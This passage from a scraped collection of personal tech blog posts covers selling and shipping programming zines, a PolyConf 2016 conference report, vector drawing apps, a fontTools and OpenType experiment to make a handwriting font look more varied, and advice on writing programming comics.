easier to stay motivated to make\nsomething awesome instead of producing something kinda half-baked. \n\n people take things they pay for more seriously \n\n Another reason I’m excited about selling zines is that I feel like, since I’ve started doing it and\ninvesting a little more into the quality, people have taken the project a little more seriously! \n\n \n “bite size linux” is a  required text in a university course! . This is extremely delightful. \n a bunch of folks who work at various companies have bought zines to give to their\ncoworkers/employees! \n \n\n I think “this costs money” is a nice way to signal “I actually spent time on this, this\nis good”. \n\n people are actually willing to buy zines \n\n At the beginning I said that I was worried that if I sold zines, nobody would buy them, and so\nnobody would learn from them, and that would be awful. Was that worry justified? Well, I actually have a little bit of\ndata about this!! The only thing I use statistics for on this website\nis how many people download my zines (I run  heap  on my zines page). Here are some stats: \n\n \n my most-downloaded zine is “so you want to be a wizard” with 5,000 clicks \n my most-bought zine is “bite size linux” with 3,000 sales (!!!) \n \n\n 3,000 sales is incredible (thank you everyone!!!!) and I’ve been totally blown away by how many\npeople have bought these zines. \n\n This actually feels like selling zines results in  more  people reading the zine – to\nme, 3,000 sales is WAY BETTER than 5,000 clicks, because I think that someone who bought a zine is\nprobably like 4x more likely to read it than someone who just clicked on a PDF. (4x being a Totally\nUnscientific Arbitrary Number). \n\n how do you decide on pricing? \n\n PRICING. EEP. GUYS. \n\n I find thinking about pricing SO CONFUSING. There’s this “charge more” narrative I see a lot on the\ninternet which basically goes: \n\n \n tie whatever you’re selling to someone else’s business outcomes \n charge them relative to how much money the product can help them make, not relative to how hard it\nwas to build \n \n\n I think this a reasonable model and it’s how things like this  guide to rails performance  are priced. \n\n This is not really how I’ve been thinking about it, though – my approach right now is just to\ncharge what I think is a reasonable/fair price, which is $10/zine. \n\n I had a super interesting conversation with  Stephanie Hurlburt ,\nthough, where she argued that I should be charging more for different reasons! Her argument was: \n\n \n We want to build a world where artist/educators can get paid fairly for their work \n $10/zine is not actually a lot of money, it’s only sustainable for julia because julia has a big\naudience \n if I could figure out how to charge more, I could share that with other people and make a world\nwhere smaller creators could be more successful \n \n\n I find that argument pretty compelling (I would like more people to be able to make money from\nselling zines!). But I don’t have any plans to charge more for individual zines than $10/zine\nbecause $10 just seems like a reasonable price to me and I know that it’s already too much for some\nfolks, especially people in countries where their currency is a lot weaker than the US dollar. \n\n experimenting with corporate pricing \n\n While I’m pretty reluctant to do experiments with the $10/zine price for individual people,\nexperimenting with corporate pricing is a lot easier! Folks generally aren’t spending their own\nmoney, so if I raise the prices for a company to buy a zine, maybe they won’t buy it if they decide\nit’s too much, but it’s a lot less personal and doesn’t affect someone’s ability to read the zines\nin the same way. \n\n Right now, companies buy zines from me for 2 reasons: \n\n \n to give them to their employees to teach folks useful things (I charge somewhere between $100 ->\n$600 for a site license right now) \n to distribute them at conferences/other events (eg microsoft  gave out zines/posters by me  at a couple of conferences this year). I’ve only just started doing this but it seems like a super fun way to get more zines into the world! \n \n\n I  have  been doing some corporate pricing experiments – for Help! I have a manager! I raised the\nminimum price to $150 because I think it’s pretty valuable to help folks work better with their\nmanagers. We’ll see what happens! \n\n why not patreon? \n\n As a sidebar – a lot of folks have suggested that I use Patreon. Right now I definitely do not want\nto use Patreon/other donation-based models for various reasons (though I support creators on Patreon\nand I think it’s great!). I don’t want to get into it in this post but maybe I’ll talk about this\nanother time! \n\n Basically to me the model of “pay $10 for a zine” is super simple, I like it, and I have no desire\nto switch to Patreon :) \n\n a tradeoff between free & paid: post drafts on Twitter \n\n What I’m doing right now is – I’ll post drafts of almost everything I write in my zines on Twitter.\nThis works really well for a lot of reasons: \n\n \n I get really early feedback on whether something is working or not – folks will suggest a lot of\ngreat improvements in the Twitter replies! \n I get to see what’s resonating with folks – for example, this  comics about\n1:1s  got 2.5K retweets, which is a lot!\nKnowing that folks found that page really useful helped me decide where to put it in the zine\n(near the beginning!) \n people who maybe can’t afford $10 for the zine can follow along on Twitter and get all the\ninformation anyway \n obviously it’s great advertising – if people like the comics I tweet, they might decide to buy\nthe zine later! :) And if they want to just enjoy the tweets that’s awesome too ❤ \n \n\n As an example, most of the pages from Help! I have a manager! are in this  twitter moment . \n\n a few things that haven’t gone well \n\n Not everything has been 100% amazing with selling zines on the internet! A couple of things that\nhaven’t gone well: \n\n \n some people don’t have credit cards / PayPal and so can’t get the zine! I would really really like\na good solution to this. \n Gumroad doesn’t have great email deliverability – sometimes when someone buys a zine it’ll end up\nin their spam. This is pretty easy to resolve (people email me to say that they didn’t get it, and\nit’s always easy to fix right away), but I wish they were better at this. Otherwise Gumroad is a\ngood platform. \n On my first zine, I didn’t put my email address on the Gumroad page, so some people didn’t know\nhow to get in touch with me when there was a problem and one person opened a dispute. Now I put my\nemail address on Gumroad which I think has fixed that! \n I sent an update email on Gumroad to past zine buyers saying that I had a new zine out and one\nperson replied to say that they didn’t like being emailed. I think there’s a little room for to\nimprove here – the fact that Gumroad autoenrolls everyone who buys a zine into an “updates” email\nlist is IMO a bit weird and it feels like it would be better if it was opt-in. \n Someone posted my blog post announcing a new zine to lobste.rs and folks commented that they\ndidn’t think it was appropriate to post non-free things on lobste.rs. I agree with that but this\nseems hard to prevent though since I can’t control what people post on tech news sites :).\nI think this isn’t a big deal but it didn’t feel great. \n \n\n I’m sure I’ll make some more mistakes in the future and hopefully I’ll learn from them :). I wanted\nto post these because I worry a lot about making mistakes when selling things to folks, but once I\nwrite down the issues so far they all feel very resolvable. Mostly I just try to reply to email fast\nwhen folks have problems, which isn’t that often. \n\n let’s see how the experiment goes! \n\n So far selling zines feels like \n\n \n I end up with a comparable amount of readers (I think there’s not a huge difference?) \n I can make something that’s higher quality (and pay more artists to help me!). It’s way easier to\njustify spending time on it. \n People take the work more seriously \n Folks have been really positive and supportive about it \n It’s maybe helping a tiny bit to build a world where more folks can get paid to write really\nawesome educational materials \n \n\n I’m excited to try out some new things in the future (hopefully printing???). I’ll try to keep\nwriting about what I learn as I go, because how to do this really hasn’t been obvious to me. I’d\nlove to hear what you think! \n\n \n\n"},
{"url": "https://jvns.ca/blog/2016/07/03/polyconf-2016/", "title": "PolyConf 2016", "content": "\n     \n\n This year I went to PolyConf! PolyConf is about writing programs in  any  programming language! People come who write Clojure and Python and Erlang and C. Leandro Pereira gave a lightning talk about programming a light array in Forth. \n\n First, the people at the conference were totally delightful. I knew only one or two people before coming, and so I walked into a room full of mostly strangers. Then I’d meet someone by the water dispenser and then learn all kinds of fascinating things from them. \n\n There were a lot of people who are very interested in programming language design which was interesting because I don’t think about how to make programming languages very much. \n\n Here are a few things I saw that I liked. \n\n art and fun \n\n Arne Brasseur  gave a really fun demo of live coding music in Clojure during the lightning talks. This is one of those things that I’ve seen before, and every time I see it it’s THE BEST. \n\n Szymon Kaliski  talked (“Exploring The Universal Library”) about art and building tools to make art. One great example he gave was – he did this choose-your-own-adventure video project with a partner, and originally there are 8 videos and he was going to hardcode all the connections between them. Instead, he made a simple visual tool. Then the person he worked with actually ended up adding 200 more videos to the project and it became way more complex and interesting. It made me think about building small tools for yourself to use and how that can work really well! \n\n programming languages \n\n [Jack Franklin]() talked about Elm, a language that tries to make it easier to write frontend Javascript code. I liked that he didn’t try at all to explain the syntax – instead, he was like “it’s built for beginners! the documentation is good! there are great examples! here’s the way a starter Elm program is usually designed!”. I tested his claims by trying to write a tiny Elm program from start to finish (including installing Elm) on my laptop during the talk. The program worked! I got a heart to follow my cursor around the screen! I still don’t know if I’d write it or not but there are some nice things. \n\n Elm seemed to be kinda a theme because [Yan Cui]() later did a live demo of coding a Snake game from scratch in Elm. He was incredibly well-prepared and I really liked it – it was really fun to see the development environment and how he built it up from scratch. \n\n Rachel Reese  gave a nice history of the programming languages that led up to F# (the ML family). I found out that one researcher would just find people in cafés and libraries reading type theory books and invite them to his reading group! This makes me want to have a reading group :) \n\n ERLANG. Erlang is on my list of “what even is that??” so I was happy that  Jan Stępień  talked about his company’s first Erlang experiment ( some slides ). I think Erlang is more like an operating system than most programming languages are. He talked about how to build a request limiter. I think – I may have this wrong – that the way you do it is you write code to count requests and then this code  supervises  all the other server processes. If those processes do too many requests, the supervisor just kills them all. Somehow this ends up propagating back into a nice error message to the user. This is super different from the normal exception handling model and I don’t really know what to think of it yet. But it does make me want to learn more about Erlang. \n\n I also learned that apparently every Erlang process / green thread has its own dedicated area of memory, and so one process definitely cannot corrupt the memory of another process. That is a new idea to me too! \n\n talks that are critical \n\n There was a lot of “hey! look at this technology! it is amazing!” at this conference. This is always nice because it’s great to be excited. But with programming things inevitably go badly sometimes, and sometimes I really like to hear about that. \n\n Hans Hübner  talked about his experience running Datomic (the time-travelling Clojure database) in production, and how they found that time travel meant that it was harder than normal to do database migrations and change their code. \n\n I really like that we’re trying to push the limits of how we think about databases, but as we do that of course some things aren’t going to work as well as we hoped. Talking about it in public means that other people can learn from your experience instead of always having to start from scratch :) \n\n I think about how to say negative things in a constructive way a lot – it’s appropriate to say “hey this is cool and I liked it!” about practically anything, but, when should you say that something  didn’t  work well? I think it’s incredibly important to talk critically about databases (for instance  aphyr ’s work on the Jepsen project) since it’s so hard to change your database, we all have a limited amount of time to experiment, and database integrity is so important. I was very happy to see a talk like this. \n\n making http servers fast \n\n Leandro Pereira  talked about a high performance HTTP server he wrote from scratch over 4 years. I thought it was a really cool hobby project and it inspired me to learn about  why we use the Linux kernel’s TCP stack? \n\n On the frontend side of web performance, Guy Bedford talked about the future of Javascript packaging and distribution (“dynamic linking for the internet”). This is something I know basically nothing about so it was interesting to see. One of his core assumptions was that to make JS packaging work well, we need HTTP/2! Maybe I should be learning more about HTTP/2. Okay! \n\n scheme & fun with compilers \n\n Speaking of programs that someone has written over a long time –  Andy Wingo  gave this very lovely talk about his work on  Guile Scheme . (which has the prettiest GNU website I’ve ever seen). I loved it because he started out talking about crafting and making things and raising chickens, and went into why he loves building compilers and then talked about some of the specific compiler features he is excited about building, how he likes making the language fast, and the kinds of speed improvements they’ve been able to get over the years. \n\n I’m now inspired to read a bunch of his old blog posts. For example he’s  written a bunch about the V8 Javascript engine . \n\n i gave a talk! \n\n I gave a talk called “systems programming is for everyone”. Lots of people said nice things and I think it went well. I came up with this extra section at the last minute called “programming experiments” about how I like to write small programs that don’t work to learn things, and I was happy I did. here are the rules: \n\n rules of programming experiments \n\n \n it doesn’t have to work \n you don’t have to finish it \n you have to learn something \n \n\n I will attempt to post some notes about the talk soon. \n\n Arne added a 4th rule which i very much agreed with – “it doesn’t have to be good” :) \n\n yay \n\n I met like 10 new people who I really liked, saw a bunch of nice talks, and overall had a great time. What else could a conference be for? The organizers did a great job and I left feeling really happy and hopeful. \n\n"},
{"url": "https://jvns.ca/blog/2019/11/18/some-notes-on-vector-drawing-apps/", "title": "Some notes on vector drawing apps", "content": "\n     \n\n For the last year and a half I’ve been using the iPad Notability app to draw my\n zines . Last week I decided I wanted more features, did a bit of research, and\ndecided to switch to Affinity Designer (a much more complicated program). So\nhere are a few quick notes about it. \n\n The main difference between them is that Notability is a simple note taking app\n(aimed at regular people), and Affinity Designer is a vector graphics app\n(aimed at illustrators / graphic designers), like Adobe Illustrator. \n\n I’ve never used a serious vector graphics program before, so it’s been cool to\nlearn what kinds of features are available! \n\n Notability is super simple \n\n This is what the Notability UI looks like. There’s a pencil, an eraser, a text\ntool, and a selection tool. That’s basically it. I LOVED this simplicity when I\nstarted using Notability, and I made 4 zines using it (help! i have a manager!,\noh shit, git!, bite size networking!, and http: use your browser’s language). \n\n \n\n Recently though, I’ve had a couple of problems with it, the main one being that\ntext boxes and things drawn with the pencil tool don’t mix well. (In general\nNotability has been GREAT though and their support team has always been\nincredibly helpful when I’ve had questions.) \n\n Affinity Designer is really complicated \n\n Affinity Designer, by comparison, is WAY more complicated. Here’s what the UI looks like: \n\n \n\n There are \n\n \n 14 tools on the left \n 14 more panels on the right that alter what the tools do \n a bottom toolbar which has different options for each tool \n 2 menus which together have another 25 things or so that you can do \n \n\n I still don’t understand what all the tools do (what’s the\ndifference between Pencil and Vector Brush? I don’t know!). But I’m pretty\nexcited about this because (unlike with Notability) there are so many options\nthat if I’m frustrated about something, 90% of the time there’s a way to do the\nthing I want! \n\n switching from Notability to Affinity Designer is really easy \n\n Switching to Notability wasn’t the best: I  reverse engineered the file\nformat \nto transfer some files over but the quality was never the best (probably\nbecause of problems with my script) and I ended up having to redraw a lot of\nthem in practice. \n\n With Affinity Designer, I can just \n\n \n export a PDF with Notability (or anything else) \n import the PDF with Affinity Designer \n and then I can easily edit it and that’s it?!? \n \n\n It’s not perfect – the vector paths it comes up with are kind of weird, probably\nbecause of the way the PDF is – but it’s very good! It makes me feel confident\nthat if I need to make a small edit to something I made in the past I can just\nimport the PDF! \n\n what can a vector drawing app do? \n\n here are a few things Affinity Designer can do that Notability can’t: \n\n \n custom paper sizes : In Notability every page is 8.5x11, but usually I\nwant something more like 5.5x8.5 which is a different aspect ratio (this is\ntechnically sort of possible in Notability by importing a PDF of the correct\nsize but it’s a pain and it means you can’t use a grid) \n custom colour palettes : I can have the 10 colours I like to use in my\ncomics all in one place \n grouping objects together  – I can “group” a bunch of objects together so\nthat I can easily resize and move them all together \n two kinds of text box . This is the kind of thing that I wouldn’t have\nunderstood 2 years ago but that now I LOVE – you can either have “art text”\nthat acts like an image (no word wrap, gets bigger when you resize it) or\n“frame text” that has word wrap and doesn’t get bigger when you resize it. \n really great import  – I can import a PDF or SVG and individually edit /\nmove around parts of the PDF. Notability doesn’t have any import tools that\nlet you edit after importing. \n custom export options for printing . I don’t understand what it  does \nyet but there are export presets for print PDFs and it fixes some printing\nproblems I was having! \n \n\n There are also a LOT more features that I’m not interested in but I’m pretty\nexcited about those 6 things and it feels like an app that I won’t grow out of. \n\n iPad apps are great \n\n I’ve been exclusively using Linux for the last 15 years where the image\nediting/media tools aren’t always great (though I really like Inkscape and I hear good things about Krita!), so\nit’s really cool to have access to all these great iPad apps. And the prices seem pretty reasonable: \n\n \n Notability is $12 \n Affinity Designer is $20 \n LumaFusion (a nice video editor I’ve been using a little) is $30 \n \n\n It doesn’t make me want a Mac (I like the Linux desktop experience!), but it’s\nnice to have access to a bunch of these great tools. And I think a lot of\nthese art tools work better on an iPad than on a computer anyway since you can\njust draw on the screen :) \n\n"},
{"url": "https://jvns.ca/blog/2019/10/28/some-research-on-shipping-print-zines/", "title": "Some research on shipping print zines", "content": "\n     \n\n I’ve been doing some preliminary research on shipping printed zines, since\n Your Linux Toolbox \nis out now and a bunch more people have been asking about print copies of my\nother zines. I thought I’d write down what I’ve learned so far because it turns\nout shipping is pretty complicated! \n\n My original question I was trying to answer was “can I ship a single zine\nanywhere in the world for less than $6 or so?“, so let’s start there. \n\n Surprisingly the best single resource I found was this\nvery extensive  PCMag article on e-commerce fulfillment services . \n\n why not use letter mail? \n\n The most obvious way to send a zine inexpensively in the mail is with letter\nmail – letters smaller than 10” x 6” and under 60g or so can be sent by letter\nmail. My zines definitely fit that criteria, even when printed on nice paper.\nThis would be really good because international package postage is EXPENSIVE,\nbut sending a letter to Belgium only costs  $2.13 according to USPS’s\nwebsite . \n\n The issue with this is the small print on that USPS page: \n\n \n Value of contents can not exceed $0.00 \n \n\n So it seems like you’re not actually allowed to send things worth money via\nletter mail. Probably that’s related to customs or something. Or maybe letter\nmail is subsidized by the government? Not sure why. \n\n Option 0: Ship zines myself \n\n I’ve done this before and it was actually really fun to do once but I think this is pretty unlikely to be a good idea because: \n\n a. cost: I live in Canada, almost everyone I sell zines to is outside of Canada, and\nb. availability: I’d like for people to be able to get shipments when I’m out of town / on vacation \n\n Option 1: Amazon \n\n One obvious answer to how to sell book-like things is “sell them on Amazon!”.\nAmazon actually has at least 3 different programs that you can use to sell\nbooks online (Amazon Advantage, Fulfilled By Amazon, Kindle Direct Publishing),\nand since Amazon is such a big thing I looked into all of them a little bit. \n\n In general the forums on  https://sellercentral.amazon.com  seem to be a good way\nto understand how the various Amazon options work for people. \n\n I wrote a lot about Amazon here but overall it doesn’t seem that great of an\noption – it’s really complicated, selling on Amazon’s website isn’t very\nappealing, and I think there would be a lot of additional fees. \n\n Kindle Direct Publishing \n\n Kindle Direct Publishing is a service where Amazon will take care of everything\nfrom printing to shipping. (It has “Kindle” in the same but they actually do\nprinting as well).  Brian Kernighan’s new Unix\nbook  is an example of a book published\nwith KDP. \n\n KDP won’t work for this project because they don’t support saddle stitching\n(stapling the zine), so I didn’t look into it too much. Here’s a link to their\n paper and cover options \nthough. \n\n Amazon Advantage \n\n Amazon Advantage doesn’t do printing – you ship them books, and then they take\ncare of shipping them to people. This seems great on its surface (“amazon just\ntakes care of it!“). \n\n advantages: \n\n \n the book on Amazon looks the same as a book from a major publisher, it shows\nup as “ships and sold by Amazon” \n \n\n disadvantages: \n\n \n Amazon Advantage takes 55% and  they  decide how to price your book. \n It costs $99/year \n “You have to ship them your books every week or two depending on how many\ncopies they want, you can’t just ship them a big shipment to keep in a\nwarehouse” \n \n\n The biggest issue for me here seems to be “you have to ship them books every\nweek or two”, which seems like it could get very expensive if Amazon Advantage\nkeeps asking you to ship them small quantities of zines. \n\n Fulfilled By Amazon \n\n Fulfilled By Amazon seems like the Amazon option that involves the least Amazon\nmagic. Basically I’d ship books to their warehouses and then they ship the things from those warehouses. \n\n how it works: \n\n \n you just pay them for shipping and warehousing fees (no percentage cost) \n you can ship them a big batch of things and they’ll store them until they’re sold \n they have  FBA global selling \nto sell in countries other than the US (by shipping to Amazon warehouses in\nthose countries) or  FBA export \n(to sell to other countries from the US store). There are a bunch of scary words on those pages about international taxes. \n \n\n Option 2: Blackbox \n\n Blackbox is a shipping company by the Cards Against Humanity folks. This is\ntheir  Pricing PDF . I’m not\n100% sure if I can work with them – the first time I filled out the form on\ntheir website saying I was interested they said they weren’t accepting new\ncustomers, but I think now they may be? \n\n Here’s the summary: \n\n \n $6.64 for domestic US shipping \n $11ish for domestic Canadian shipping \n $10ish for domestic Australia shipping \n $7ish for domestic UK shipping \n $10ish for international shipping from their UK warehouse to anywhere in the world \n \n\n Option 3: Shipbob \n\n Shipbob is a shipping company for smaller ecommerce companies. Here’s the  pricing PDF I found . \n\n \n $6ish for domestic US shipping \n $10ish for shipping to other countries \n \n\n The main difference as far as I can tell between Shipbob and Blackbox is that\nShipbox lets you include up to 5 items per order for free and Blackbox charges\n$0.70 per additional item in an order. \n\n Shipbob advertises a 99.8% fulfillment accuracy rate which is pretty\ninteresting – it means they expect 2 in 1000 orders to have a problem. That\nseems pretty good! \n\n Option 4: Whiplash \n\n Similar to the other two above.  Their pricing\npage . Shipbob and Blackbox both include\neverything (shipping, packaging materials, and someone packing your order) in\ntheir fee, and Whiplash seems to charge separately for shipping. \n\n Shipping 1 thing costs the same as shipping 5 things \n\n Zines are pretty light – I just weighed some of my zines printed on high\nquality paper on my kitchen scale and they’re 40g each on average. Most of\nthese shipping services seem to charge in increments of half a pound, so\nshipping 5 zines (about 200g) costs about the same as shipping 1 zine (about\n40g). \n\n This makes me think it would be more reasonable to focus on shipping packages\nof many zines – right now the  6 pack of all my zines  costs $58 for a PDF\ncollection, and $6-$12 shipping for something around that price seems\nsuper reasonable (and I could probably even do “free” shipping, aka pay the\nshipping costs myself). \n\n The other thing that I think could be work well is shipping packages of 5 or 10\nof the same zine so that a group of people can each get a zine and save on\nshipping costs. \n\n this seems like it could work! \n\n I still have no plan for how to print zines, but writing all this down makes me\nfeel pretty optimistic about being able to ship zines to people. Even though\nshipping individual zines doesn’t seem that practical, I think shipping packs\nof 5-10 zines could be really reasonable! \n\n Speaking of print – I printed a zine with Lulu last week and just got it in\nthe mail yesterday. I didn’t think Lulu would be able to print it in the way I\nwanted, and they didn’t, so I’m really happy to know that and be able to move\non to trying other non-print-on-demand printers. \n\n"},
{"url": "https://jvns.ca/blog/2020/08/08/handwritten-font/", "title": "An attempt to make a font look more handwritten", "content": "\n     \n\n I’m actually not super happy with the results of this experiment, but I wanted\nto share it anyway because it was very easy and fun to play with fonts. And\nsomebody asked me how to do it and I told her I’d write a blog post about it :) \n\n background: the original handwritten font \n\n Some background: I have a font of my handwriting that I’ve been use in my zines\nfor a couple of years. I made it using a delightful app called\n iFontMaker . They pitch\nthemselves on their website as “You can create your handmade typeface in less\nthan 5 minutes just with your fingers”. In my experience the ‘5 minutes” part\nis pretty accurate – I might have spent more like 15 minutes.  I’m skeptical\nof the “just your fingers” claim – I used an Apple Pencil, which has much\nbetter accuracy. But it is extremely easy to make a TTF font of your\nhandwriting with the app and if you happen to already have an Apple Pencil and\niPad I think it’s a fun way to spend $7.99. \n\n Here’s what my font looks like. The “CONNECT” text on the left is my actual\nhandwriting, and the paragraph on the right is the font. There are actually 2\nfonts – there’s a regular font and a handwritten “monospace” font. (which\nactually isn’t monospace in practice, I haven’t figured out how to make an\nactual monospace font in iFontMaker) \n\n \n \n \n\n the goal: have more character variation in the font \n\n In the screenshot above, it’s pretty obvious that it’s a font and not actual\nhandwriting. It’s easiest to see this when you have two of the same letter next\nto each other, like in “HTTP’. \n\n So I thought it might be fun to use some OpenType features to somehow introduce\na little more variation into this font, like maybe the two Ts could be\ndifferent. I didn’t know how to do this though! \n\n idea from Tristan Hume: use OpenType! \n\n Then I was at !!Con 2020 in May (all the  talk recordings are\nhere! ) and saw this talk by Tristan\nHume about using OpenType to place commas in big numbers by using a special font.\nHis talk and blog post are both great so here are a bunch of links – the live\ndemo is maybe the fastest way to see his results. \n\n \n a live demo:  Numderline Test \n the blog post:  Commas in big numbers everywhere: An OpenType adventure \n the talk:  !!Con 2020 - Using font shaping to put commas in big numbers EVERYWHERE!! by Tristan Hume \n the github repo:  https://github.com/trishume/numderline/blob/master/patcher.py \n \n\n the main idea: OpenType lets you replace characters based on context \n\n I started out being extremely confused about what OpenType even is. I still don’t know much, but I\nlearned that you can write extremely simple OpenType rules to change how a\nfont looks, and you don’t even have to really understand anything about fonts. \n\n Here’s an example rule: \n\n sub a' b by other_a;\n \n\n What  sub a' b by other_a;  means is: If an  a  glyph is before a  b , then replace the  a  with the glyph  other_a . \n\n So this means I can make  ab  appear different from  ac  in the font. It’s not\nrandom the way handwriting is, but it does introduce a little bit of variation. \n\n OpenType reference documentation: awesome \n\n The best documentation I found for OpenType was this  OpenType™ Feature File Specification  reference. There are a lot of examples of cool things you can do in there, like replace “ffi” with a ligature. \n\n how to apply these rules:  fonttools \n\n Adding new OpenType rules to a font is extremely easy. There’s a Python library\ncalled  fonttools , and these 5 lines of code will apply a list of OpenType\nrules (in  rules.fea ) to the font file  input.ttf . \n\n from fontTools.ttLib import TTFont\nfrom fontTools.feaLib.builder import addOpenTypeFeatures\n\nft_font = TTFont('input.ttf')\naddOpenTypeFeatures(ft_font, 'rules.fea', tables=['GSUB'])\nft_font.save('output.ttf')\n \n\n fontTools  also provides a couple of command line tools called  ttx  and\n fonttools .  ttx  converts a TTF font into an XML file, which was useful to me\nbecause I wanted to rename some glyphs in my font but did not understand\nanything about fonts. So I just converted my font into an XML file, used  sed \nto rename the glyphs, and then used  ttx  again to convert the XML file back into a  ttf . \n\n fonttools merge  let me merge my 3 handwriting fonts into 1 so that I had all the glyphs I needed in 1 file. \n\n the code \n\n I put my extremely hacky code for doing this in a repository called\n font-mixer . It’s like 33 lines of code and I think it’s pretty straightforward. (it’s all in  run.sh  and  combine.py ) \n\n the results \n\n Here’s a small sample the old font and the new font. I don’t think the new font\n“feels” that much more like handwriting – there’s a little more variation, but\nit still doesn’t compare to actual handwritten text (at the bottom). \n\n It feels a little uncanny valley to me, like it’s obviously still a\nfont but it’s pretending to be something else. \n\n \n\n And here’s a sample of the same text actually written by hand: \n\n \n\n It’s possible that the results would be better if I was more careful about how\nI made the 2 other handwriting fonts I mixed the original font with. \n\n it’s cool that it’s so easy to add opentype rules! \n\n Mostly what was delightful to me here is that it’s so easy to add OpenType\nrules to change how fonts work, like you can pretty easily make a font where\nthe word “the” is always replaced with “teh” (typos all the time!). \n\n I still don’t know how to make a more realistic handwriting font though :).\nI’m still using the old one (without the extra variations) and I’m pretty happy with it. \n\n"},
{"url": "https://jvns.ca/blog/2020/12/05/how-i-write-useful-programming-comics/", "title": "How I write useful programming comics", "content": "\n     \n\n How I write useful programming comics \n\n The other day a friend was asking me how I write  programming comics . I’ve tried\nto write about this at least 6 times\n( 1 ,\n 2 ,\n 3 ,\n 4 ,\n 5 ,\n 6 ), but I felt like\nthere’s still something missing so here’s another attempt. \n\n drawing isn’t the hard part \n\n The 2 common questions/comments I get about my comics are: \n\n \n “what tools do you use?” (an ipad + apple pencil + a drawing app). \n I wish I were good at drawing so that I could do that \n \n\n But neither of these is what I actually find hard about comics: I’m actually  very bad at drawing , and I’ve made comics that people love with very simple tools, like taking a  low-quality picture of a notebook with my phone . \n\n So what’s the secret? \n\n 3 types of comics I draw \n\n I think a lot of my comics fall into 3 categories. I don’t think that this\ncategorization is totally accurate, but I think it’s a helpful way to start\ntalking about how to do it. \n\n Type 1: the Surprising/Hidden Fact \n\n Here are 10 examples of surprising ideas I’ve written about: \n\n \n SELECT queries aren’t executed in the order they’re written in \n position: absolute isn’t absolute \n cookies let a server store information in your browser \n the /proc directory on linux lets you access information about processes \n linux uses copy on write for a new process’s memory \n ngrep is like ‘grep’ for network packets \n a git branch is a pointer to a commit \n if you ask about specific things you want feedback on, you’re more likely to get the feedback you need \n container layers are implemented using overlay filesystems \n \n\n Of course, a lot of these aren’t that surprising when you already know about\nthem – “cookies let a server store information in your browser” is a basic\nfact about how cookies work! But if you don’t already know it, it’s pretty\nsurprising and kind of exciting to learn. \n\n I think there are at least two subtypes of surprising facts here: \n\n \n Facts that tell you about something you can  do  (like “use ngrep to grep your network packets”) \n Facts that explain why something works the way it does (“oh, I’m always confused about SQL queries because they’re not executed in the order they’re written in! That explains a lot!”) \n \n\n Type 2: the List of Important Things about X \n\n This sounds pretty boring at first (“uh, a list?”), but most of the comics I’ve\ndrawn where people tell me “This is amazing, I printed this out and put it on\nmy wall” are lists. Here are some examples of list comics: \n\n \n every linux networking tool I know \n what to talk about in 1:1s with your manager \n the most important HTTP request headers \n HTTP status codes \n ways I want my team to be \n grep’s command line arguments \n find’s command line arguments \n dig’s command line arguments \n about 30 other “X’s most important command line arguments and what they do”\n(basically all of  bite size command\nline  and  bite size\nnetworking ) \n \n\n A key things about this is that it’s not just “a list of facts about X” (anyone\ncan make a list!) but a list of  the most important facts  about X. For\nexample, grep has a lot of command line arguments. But it turns out that I\nonly ever use 9 of them even though I use a grep a LOT, and that each\nof those 9 options can be explained in just a few words. \n\n All of the topics are super specific, like “HTTP request headers”, “HTTP\nresponse headers”, and “topics for 1:1s”. \n\n Type 3: the Relatable Story \n\n The last type (and the type I’m the least certain how to categorize) is sort of\na story that resonates with people. I think that this one is really important\nbut I can’t do it justice right now so I’m going to stick to talking about the\nother two types in this post. \n\n \n take on hard projects \n how I got better at debugging \n how to be a wizard programmer \n data analysis is always more work than I think \n \n\n source 1 of Surprising Facts: things I learned somewhat recently \n\n Okay, so how do you find surprising facts to share? The way I started out was\nto just share things I learned that I was surprised by! \n\n I started doing this on my blog, not in comics: I’d learn something that I was\nsurprised by, and think “oh, this is cool, I should write a blog post about it\nso other people can learn it too!“. And then I’d write it up and often people\nwould be really happy to learn the thing too! \n\n Obviously I don’t think everyone needs to have a tech blog, but I  do  think\nthat noticing surprising computer facts as you learn them and explaining them\nclearly is a skill that you need to practice if you want to get good at it! \n\n source 2 of Surprising Facts: things other people find surprising \n\n Recently I’ve moved a little more into what I feel is the Hard Mode of\nsurprising facts – things that I have not been personally surprised by\nrecently, but that a lot of people who don’t know about the topic yet would be\nreally surprised by. \n\n I think the main way to discover Surprising Facts like this is by talking to\npeople who do not know the thing already and observing what they find\nsurprising. For example I might have an interaction like this: \n\n \n me (showing someone to a coworker) so you can do TASK like this… \n coworker: um wait you can do that?? That’s so cool! I have a lot of questions! \n me: oh yeah it’s so useful! \n \n\n For me, HTTP cookies were an example this – I’d forgotten that it could be\nsurprising / interesting to learn how they worked because I learned about them\na while ago, and then one day a friend asked me “hey, how do cookies work?”.\nAnd I remembered that it’s really cool and useful to know, so I wrote it down! \n\n Another example of this is  SELECT queries start with FROM  – this was something\nthat I understood intuitively and hadn’t thought about. But when walking through a SQL query’s\nexecution with someone, I noticed that they were really surprised that you\ndidn’t execute the query in the same order that it was written. And I realized\n“oh yeah, that IS weird actually, I bet a lot of other people are confused by\nthat too!“. So I wrote it down and it helped a lot of people! \n\n I think the skill of “figuring out what people typically find surprising when\nlearning a topic and coming up with clear explanations” is probably called\n“teaching”. \n\n Lists of Important Things are a little bit easier to write \n\n I find writing lists a little easier than writing Surprising Facts – it’s hard\nto come up with a useful topic for a list, but once I have the topic (like\n“every linux networking tool I know”), it feels somewhat straightforward to list\nthem all and briefly explain the basics of each one. \n\n I only write comics about things I know relatively well \n\n People also ask me pretty often if I write comics about topics I’m learning as\nI learn them. I don’t do this basically because I find writing short things a\nLOT harder than writing long things. \n\n I do write blog posts about topics I’m just learning – if there’s a topic I’m\nstill not super clear on, I can usually write a 1200-word blog post about it\nwith some basic facts and questions and examples.  But if I’m still a little\nbit confused about the topic, it’s very hard to definitively list “Here are the\n3 most important surprising facts you need to know to understand TOPIC”,\nbecause very likely I actually don’t know those 3 facts yet! Or maybe I kind of\nknow them, they’re mixed in with a lot of other things that I’m not sure about\nand aren’t as important. \n\n that’s all for now! \n\n Hopefully this is helpful! Someone pointed out that this advice might also\napply to blog posts, which, maybe it does! \n\n"},
